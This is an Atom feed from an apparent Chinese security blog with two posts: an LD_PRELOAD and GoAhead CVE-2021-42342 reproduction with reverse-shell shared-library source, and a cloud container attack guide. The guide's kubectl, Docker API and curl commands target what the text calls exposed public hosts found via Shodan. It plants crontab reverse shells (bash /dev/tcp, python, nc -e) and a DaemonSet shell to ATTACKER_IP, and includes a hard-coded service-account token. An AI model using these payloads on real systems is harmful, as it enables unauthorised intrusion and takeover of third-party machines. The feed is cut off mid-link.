<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://misakikata.github.io/"/>
  <updated>2022-07-01T10:31:39.251Z</updated>
  <id>https://misakikata.github.io/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>LD_PRELOAD变量注入</title>
    <link href="https://misakikata.github.io/2022/07/LD-PRELOAD%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
    <id>https://misakikata.github.io/2022/07/LD-PRELOAD变量注入/</id>
    <published>2022-07-01T10:31:39.000Z</published>
    <updated>2022-07-01T10:31:39.251Z</updated>
    
    <content type="html"><![CDATA[<h3 id="环境变量注入"><a href="#环境变量注入" class="headerlink" title="环境变量注入"></a>环境变量注入</h3><p>前两天看到一个ACTF的WP，由于没有参加，所以不太清楚题目，但是其中有一个gogogo的题目，利用的是环境变量的注入方式，而且还是LD_PRELOAD劫持。这个漏洞是GoAhead的一个CVE-2021-42342。</p><h3 id="CVE-2021-42342"><a href="#CVE-2021-42342" class="headerlink" title="CVE-2021-42342"></a>CVE-2021-42342</h3><p>先复现一下这个漏洞，直接利用vulhub的靶场，<code>/vulhub/goahead/CVE-2021-42342</code>。</p><p>访问<code>http://127.0.0.1:8080/cgi-bin/index</code>，在这个地方上传一个恶意的so文件。</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys&#x2F;socket.h&gt;#include&lt;netinet&#x2F;in.h&gt;char *server_ip&#x3D;&quot;192.168.36.138&quot;;uint32_t server_port&#x3D;1234;static void reverse_shell(void) __attribute__((constructor));static void reverse_shell(void)&#123;    int sock &#x3D; socket(AF_INET, SOCK_STREAM, 0);    struct sockaddr_in attacker_addr &#x3D; &#123;0&#125;;    attacker_addr.sin_family &#x3D; AF_INET;    attacker_addr.sin_port &#x3D; htons(server_port);    attacker_addr.sin_addr.s_addr &#x3D; inet_addr(server_ip);    if(connect(sock, (struct sockaddr *)&amp;attacker_addr,sizeof(attacker_addr))!&#x3D;0)        exit(0);    dup2(sock, 0);    dup2(sock, 1);    dup2(sock, 2);    execve(&quot;&#x2F;bin&#x2F;bash&quot;, 0, 0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译如上的文件</p><pre class="line-numbers language-none"><code class="language-none">gcc -s -shared -fPIC .&#x2F;hack.c -o hack.so  #由于对so有大小限制，这里才带-s参数。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成一个so文件后，可以直接利用给出的poc.py发送。或者也可以利用BURP构造包来发送。</p><pre class="line-numbers language-none"><code class="language-none">python poc.py http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cgi-bin&#x2F;index hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果需要使用burp来构造包则需要注意一点就是保持文件描述符不被关闭，关闭选项上repeater的第一个update选项，同时修改包中的Content-Length长度，由于我的so是14384字节，这里改成15000.最后再用多余的字节填充到比15000多一些即可。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202207011831808.png" alt="image-20220701155215245"></p><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>通过上面这个漏洞的利用，可以看到使用了LD_PRELOAD这个环境变量，这个东西影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。</p><p>LD_PRELOAD环境变量相信都在PHP绕过<strong>disable_function</strong>函数的时候见过，就是利用劫持进行覆写相关的函数来执行恶意的so。</p><p>如果需要实现这种注入攻击的方式，则至少需要满足：</p><ol><li>能够上传自己的.so文件</li><li>能够控制环境变量的值（设置LD_PRELOAD变量），比如<strong>putenv</strong>函数</li></ol><p>如果还需要绕过disable_function，还需要一个外部功能的函数可以执行，常见的比如PHP的mail函数。</p><p>这里用一个编写的demo，比如我们想劫持/usr/bin/grep命令，可以先查看ls的动态链接库文件，<code>readelf -Ws</code>来查看。</p><p><img src="file://E:\Typora%20File\typroa%E5%9B%BE%E5%83%8F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5\image-20220701163415305.png?lastModify=1656671436" alt="image-20220701163415305"></p><p>这里我们选用<code>strcpy@GLIBC_2.2.5 (3)</code>这个链接库。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;​void payload() &#123;    system(&quot;id&quot;);&#125;​char *strcpy(char *dest, const char *src) &#123;   &#x2F;&#x2F;需要搜索查看函数的原型    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123;        return 0;    &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者，这个<code>__attribute__((constructor))</code>的意思是先于main()函数调用 ，这种情况下大部分函数都可以劫持到。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;unistd.h&gt;​static void before(void) __attribute__((constructor));​static void before(void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;id&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译</p><pre class="line-numbers language-none"><code class="language-none">gcc -s hack.c -fPIC -shared -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把这个so加入到环境变量中</p><pre class="line-numbers language-none"><code class="language-none">export LD_PRELOAD&#x3D;$PWD&#x2F;hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202207011830676.png" alt="image-20220701163438797"></p><p><strong>禁用</strong></p><p>使用gcc的-static参数可以把libc.so.6静态链入执行程序中。但这也就意味着你的程序不再支持动态链接。</p><p>参考文章：</p><p><a href="https://tttang.com/archive/1399/">https://tttang.com/archive/1399/</a></p><p><a href="https://mp.weixin.qq.com/s/Y_02LhQsGa8jhoA7qmSWLw">https://mp.weixin.qq.com/s/Y_02LhQsGa8jhoA7qmSWLw</a></p><p><a href="https://forum.butian.net/share/1493">https://forum.butian.net/share/1493</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;环境变量注入&quot;&gt;&lt;a href=&quot;#环境变量注入&quot; class=&quot;headerlink&quot; title=&quot;环境变量注入&quot;&gt;&lt;/a&gt;环境变量注入&lt;/h3&gt;&lt;p&gt;前两天看到一个ACTF的WP，由于没有参加，所以不太清楚题目，但是其中有一个gogogo的题目，利用的是环境
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>云容器安全</title>
    <link href="https://misakikata.github.io/2022/03/%E4%BA%91%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <id>https://misakikata.github.io/2022/03/云容器安全/</id>
    <published>2022-03-22T08:24:43.000Z</published>
    <updated>2022-03-22T08:27:56.463Z</updated>
    
    <content type="html"><![CDATA[<h3 id="云容器安全初识"><a href="#云容器安全初识" class="headerlink" title="云容器安全初识"></a>云容器安全初识</h3><h4 id="API-Server未授权访问"><a href="#API-Server未授权访问" class="headerlink" title="API Server未授权访问"></a>API Server未授权访问</h4><p>利用两个外部的环境：<a href="http://34.219.148.35:8080/">http://34.219.148.35:8080/</a>、<a href="http://212.193.88.186:8080/">http://212.193.88.186:8080/</a></p><p>API Server 默认会开启两个端口：<code>8080</code> 和 <code>6443</code>。<br>其中 8080 端口无需认证，应该仅用于测试。6443 端口需要认证，且有 TLS 保护。</p><pre class="line-numbers language-none"><code class="language-none">kubectl create clusterrolebinding system:anonymous --clusterrole&#x3D;cluster-admin --user&#x3D;system:anonymous   &#x2F;&#x2F;使6443 端口允许匿名用户<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接访问 8080 端口会返回可用的 API 列表，如：</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;paths&quot;: [    &quot;&#x2F;api&quot;,    &quot;&#x2F;api&#x2F;v1&quot;,    &quot;&#x2F;apis&quot;,    &quot;&#x2F;apis&#x2F;extensions&quot;,    &quot;&#x2F;apis&#x2F;extensions&#x2F;v1beta1&quot;,    &quot;&#x2F;healthz&quot;,    &quot;&#x2F;healthz&#x2F;ping&quot;,    &quot;&#x2F;logs&#x2F;&quot;,    &quot;&#x2F;metrics&quot;,    &quot;&#x2F;resetMetrics&quot;,    &quot;&#x2F;swagger-ui&#x2F;&quot;,    &quot;&#x2F;swaggerapi&#x2F;&quot;,    &quot;&#x2F;ui&#x2F;&quot;,    &quot;&#x2F;version&quot;  ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而直接访问 6443 端口会提示无权限：`User “system:anonymous” cannot get at the cluster scope.</p><p>如果安装了dashboard，访问 <code>/ui</code> 会跳转到 <code>dashboard</code> 页面，可以创建、修改、删除容器，查看日志等。</p><p>Kubernetes 官方提供了一个命令行工具 <a href="https://kubernetes.io/docs/user-guide/kubectl-overview/">kubectl</a>。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 获得所有节点kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; get nodes&#x2F;&#x2F; 获得所有容器kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; get pods --all-namespaces&#x3D;true&#x2F;&#x2F; 在 myapp 容器获得一个交互式 shellkubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp --namespace&#x3D;default -it -- bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据 Kubernetes 文档中<a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">挂载节点目录</a>的例子，可以写一个 <code>myapp.yaml</code>，将节点的根目录挂载到容器的 <code>/mnt</code> 目录。</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1kind: Podmetadata:  name: myappspec:  containers:  - image: nginx    name: test-container    volumeMounts:    - mountPath: &#x2F;mnt      name: test-volume  volumes:  - name: test-volume    hostPath:      path: &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用 kubectl 创建容器：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 由 myapp.yaml 创建容器kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F;http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; create -f myapp.yaml​&#x2F;&#x2F; 等待容器创建完成&#x2F;&#x2F; 获得 myapp 的交互式 shellkubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp --namespace&#x3D;default -it -- bash​&#x2F;&#x2F; 向 crontab 写入反弹 shell 的定时任务echo -e &quot;* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888 0&gt;&amp;1\n&quot; &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;crontab​&#x2F;&#x2F; 也可以用 python 反弹 shellecho -e &quot;* * * * * root &#x2F;usr&#x2F;bin&#x2F;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;\n&quot; &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;crontab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221613236.png" alt="image-20220311143128477"></p><p>如果不需要反弹shell，只需要在docker内执行命令的话</p><pre class="line-numbers language-none"><code class="language-none">kubectl -s http:&#x2F;&#x2F;34.219.148.35:8080&#x2F; exec myapp -it -- ls &#x2F;etc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上使用的端口为8080，如果需要使用6443，则需要将”system:anonymous”用户绑定到”cluster-admin”用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令。</p><p><strong>使用shodan上的一个环境</strong>，<a href="https://34.209.45.207:6443/%E3%80%82">https://34.209.45.207:6443/。</a></p><p>查看pods：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods?limit&#x3D;500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221614321.png" alt="image-20220311160028406"></p><p>添加一个pods</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发送一段json数据</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;annotations&quot;:&#123;&quot;kubectl.kubernetes.io&#x2F;last-applied-configuration&quot;:&quot;&#123;\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;kind\&quot;:\&quot;Pod\&quot;,\&quot;metadata\&quot;:&#123;\&quot;annotations\&quot;:&#123;&#125;,\&quot;name\&quot;:\&quot;test-4444\&quot;,\&quot;namespace\&quot;:\&quot;default\&quot;&#125;,\&quot;spec\&quot;:&#123;\&quot;containers\&quot;:[&#123;\&quot;image\&quot;:\&quot;nginx:1.14.2\&quot;,\&quot;name\&quot;:\&quot;test-4444\&quot;,\&quot;volumeMounts\&quot;:[&#123;\&quot;mountPath\&quot;:\&quot;&#x2F;host\&quot;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;],\&quot;volumes\&quot;:[&#123;\&quot;hostPath\&quot;:&#123;\&quot;path\&quot;:\&quot;&#x2F;\&quot;,\&quot;type\&quot;:\&quot;Directory\&quot;&#125;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;&#125;\n&quot;&#125;,&quot;name&quot;:&quot;test-4444&quot;,&quot;namespace&quot;:&quot;default&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test-4444&quot;,&quot;volumeMounts&quot;:[&#123;&quot;mountPath&quot;:&quot;&#x2F;host&quot;,&quot;name&quot;:&quot;host&quot;&#125;]&#125;],&quot;volumes&quot;:[&#123;&quot;hostPath&quot;:&#123;&quot;path&quot;:&quot;&#x2F;&quot;,&quot;type&quot;:&quot;Directory&quot;&#125;,&quot;name&quot;:&quot;host&quot;&#125;]&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221614134.png" alt="image-20220311162415147"></p><p>执行命令，</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;test-4444&#x2F;exec?stdout&#x3D;1&amp;stderr&#x3D;1&amp;tty&#x3D;true&amp;command&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示错误，对于websocket连接，首先进行http(s)调用，然后是使用HTTP Upgrade标头对websocket的升级请求。</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;kind&quot;: &quot;Status&quot;,  &quot;apiVersion&quot;: &quot;v1&quot;,  &quot;metadata&quot;: &#123;​  &#125;,  &quot;status&quot;: &quot;Failure&quot;,  &quot;message&quot;: &quot;Upgrade request required&quot;,  &quot;reason&quot;: &quot;BadRequest&quot;,  &quot;code&quot;: 400&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用wscat，地址：<a href="https://github.com/websockets/wscat/archive/refs/tags/3.0.0.zip">https://github.com/websockets/wscat/archive/refs/tags/3.0.0.zip</a></p><p>较新的版本只支持ws开头的协议，这里换个老点的版本</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;wscat -n -c &quot;https:&#x2F;&#x2F;34.209.45.207:6443&#x2F;api&#x2F;v1&#x2F;namespaces&#x2F;default&#x2F;pods&#x2F;test-4444&#x2F;exec?stdout&#x3D;1&amp;stderr&#x3D;1&amp;tty&#x3D;true&amp;command&#x3D;id&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="利用yaml创建反弹shell"><a href="#利用yaml创建反弹shell" class="headerlink" title="利用yaml创建反弹shell"></a>利用yaml创建反弹shell</h4><p>前提需要容器逃逸，在控制节点上创建。</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: apps&#x2F;v1kind: DaemonSetmetadata:  name: kube-cache-node1  namespace: kube-systemspec:  selector:    matchLabels:      app: kube-cache-node1  template:    metadata:      labels:        app: kube-cache-node1    spec:      hostNetwork: true      hostPID: true      containers:      - name: main        image: bash        imagePullPolicy: IfNotPresent        command: [&quot;bash&quot;]        # reverse shell        args: [&quot;-c&quot;, &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ATTACKER_IP&#x2F;ATTACKER_PORT 0&gt;&amp;1&quot;]        securityContext:          privileged: true        volumeMounts:        - mountPath: &#x2F;host          name: host-root      volumes:      - name: host-root        hostPath:          path: &#x2F;          type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用容器逃逸后的shell在目标控制节点上将上述内容保存为<code>kiit.yaml</code>并执行：</p><pre class="line-numbers language-none"><code class="language-none">kubectl apply -f kiit.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Docker-Daemon服务暴露至公网"><a href="#Docker-Daemon服务暴露至公网" class="headerlink" title="Docker Daemon服务暴露至公网"></a>Docker Daemon服务暴露至公网</h4><p>Client上使用命令后，会发送对应的请求到API，也就是Docker Daemon服务。然后docker会去对应的Registry仓库拉取镜像创建容器。</p><p>这个服务本地会暴露在unix:///var/run/docker.sock上，如果容器中有权限访问到这个文件，就可以对宿主机的所有容器进行操作。</p><p>比如：<a href="http://68.183.144.186:2375/">http://68.183.144.186:2375/</a></p><p>直接访问，或者使用docker访问</p><pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看docker下的镜像</p><pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 images<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建容器，利用bash和crontab计划任务向宿主机写入shell:</p><p>centos系统挂载路径为 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p><pre class="line-numbers language-none"><code class="language-none"># 查看宿主机可用镜像docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 image​# 启动刚刚创建的容器并连接docker -H tcp:&#x2F;&#x2F;51.195.28.76:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;51.195.28.76:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616072.png" alt="image-20220314143117085"></p><p>使用镜像来创建一个容器</p><pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; dcf4d4bef137 &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动成功后，自动进入了这个容器内</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616073.png" alt="image-20220314143537187"></p><p>写入反弹shell</p><pre class="line-numbers language-none"><code class="language-none">root@177ac63fbb2f:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;158.247.216.146&#x2F;8899 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是这个容器并没有启动，退出后会发现这个容器也停止了。需要先把这个容器启动运行。</p><pre class="line-numbers language-none"><code class="language-none">docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 ps -adocker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 start 8f351dbd41d7docker -H tcp:&#x2F;&#x2F;68.183.144.186:2375 exec -it --user root 8f351dbd41d7 &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202203221616074.png" alt="image-20220314151745747"></p><p>或者使用python来执行，例如</p><pre class="line-numbers language-none"><code class="language-none">import docker​client &#x3D; docker.DockerClient(base_url&#x3D;&#39;http:&#x2F;&#x2F;192.168.11.160:2375&#x2F;&#39;)data &#x3D; client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;*&#x2F;1 * * * * &#x2F;usr&#x2F;bin&#x2F;nc 192.168.11.1 21 -e &#x2F;bin&#x2F;sh&#39; &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root&quot; &#39;&#39;&#39;, remove&#x3D;True, volumes&#x3D;&#123;&#39;&#x2F;etc&#39;: &#123;&#39;bind&#39;: &#39;&#x2F;tmp&#x2F;etc&#39;, &#39;mode&#39;: &#39;rw&#39;&#125;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Kubelet-10250端口未授权访问"><a href="#Kubelet-10250端口未授权访问" class="headerlink" title="Kubelet 10250端口未授权访问"></a>Kubelet 10250端口未授权访问</h4><p>10250端口是kubelet API的HTTPS端口，该端口对外提供了Pod和Node的相关信息，如果该端口对公网暴露，并且关闭授权，则可能导致攻击。</p><pre class="line-numbers language-none"><code class="language-none">curl -k https:&#x2F;&#x2F;172.18.0.2:10250&#x2F;run&#x2F;&#123;namespace&#125;&#x2F;&#123;podName&#125;&#x2F;&#123;appName&#125; -d &quot;cmd&#x3D;whoami&quot;或：curl --insecure -v -H &quot;X-Stream-Protocol-Version: v2.channel.k8s.io&quot; -H &quot;X-Stream-Protocol-Version: channel.k8s.io&quot; -X POST &quot;https:&#x2F;&#x2F;kube-node-here:10250&#x2F;exec&#x2F;&lt;namespace&gt;&#x2F;&lt;podname&gt;&#x2F;&lt;container-name&gt;?command&#x3D;touch&amp;command&#x3D;hello_world&amp;input&#x3D;1&amp;output&#x3D;1&amp;tty&#x3D;1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Kubernetes-Dashboard未授权访问"><a href="#Kubernetes-Dashboard未授权访问" class="headerlink" title="Kubernetes Dashboard未授权访问"></a>Kubernetes Dashboard未授权访问</h4><p>如果Kubernetes API Server配置了Dashboard,通过路径/ui即可访问，直接访问部署一个docker即可</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1kind: Podmetadata:  name: testspec:  containers:  - name: busybox    image: busybox:1.29.2    command: [&quot;&#x2F;bin&#x2F;sh&quot;]    args: [&quot;-c&quot;, &quot;nc attacker 4444 -e &#x2F;bin&#x2F;sh&quot;]    volumeMounts:    - name: host      mountPath: &#x2F;host  volumes:  - name: host    hostPath:      path: &#x2F;      type: Directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="k8s-serviceaccount-token-泄露"><a href="#k8s-serviceaccount-token-泄露" class="headerlink" title="k8s serviceaccount token 泄露"></a>k8s serviceaccount token 泄露</h4><p>由于k8s集群部署的时候默认会在每个<code>pod</code>容器中挂载token文件到<br><code>/run/secrets/kubernetes.io/serviceaccount/token</code></p><p>我们可以通过命令行工具 <code>kubectl</code>来对<code>api-server</code>进行操作。</p><p>创建一个<code>k8s.yaml</code>配置文件，如下，token处为我们上面拿到的token，server则填写 api-server的地址</p><pre class="line-numbers language-none"><code class="language-none">apiVersion: v1clusters:- cluster:    insecure-skip-tls-verify: true    server: https:&#x2F;&#x2F;10.247.0.1  name: cluster-namecontexts:- context:    cluster: cluster-name    namespace: test    user: admin  name: admincurrent-context: adminkind: Configpreferences: &#123;&#125;users:- name: admin  user:    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行以下命令远程连接进入题目的k8s集群，成功通过认证。</p><pre class="line-numbers language-none"><code class="language-none">kubectl --kubeconfig k8s.yaml cluster-info --insecure-skip-tls-verify&#x3D;true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Etcd未授权访问"><a href="#Etcd未授权访问" class="headerlink" title="Etcd未授权访问"></a>Etcd未授权访问</h4><p>其默认监听了2379等端口，如果2379端口暴露到公网，可能造成敏感信息泄露。</p><p>首先在Kubernetes中可以更改配置/etc/Kubernetes/manifests/etcd.yaml文件的内容，来将2379端口向外暴露</p><p>Etcd v2和v3是两套不兼容的API，K8s是用的v3，所以需要先通过环境变量设置API为v3</p><pre class="line-numbers language-none"><code class="language-none">export ETCDCTL_API&#x3D;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>列出该目录所有节点的信息<br><a href="http://152.7.98.135:2379/v2/keys">http://152.7.98.135:2379/v2/keys</a></p><p>添加上recursive=true参数,就会递归地列出所有的值<br><a href="http://152.7.98.135:2379/v2/keys/?recursive=true">http://152.7.98.135:2379/v2/keys/?recursive=true</a></p><p><a href="http://152.7.98.135:2379/v2/members">http://152.7.98.135:2379/v2/members</a> 集群中各个成员的信息</p><p>安装etcdctl，可以使用类似的方式查询API</p><pre class="line-numbers language-none"><code class="language-none">etcdctl --endpoint&#x3D;http:&#x2F;&#x2F;[etcd_server_ip]:2379 ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若存在路径/registry/secrets/default，其中可能包含对集群提升权限的默认服务令牌。</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/4276">https://xz.aliyun.com/t/4276</a><br><a href="https://tttang.com/archive/1389/">https://tttang.com/archive/1389/</a><br><a 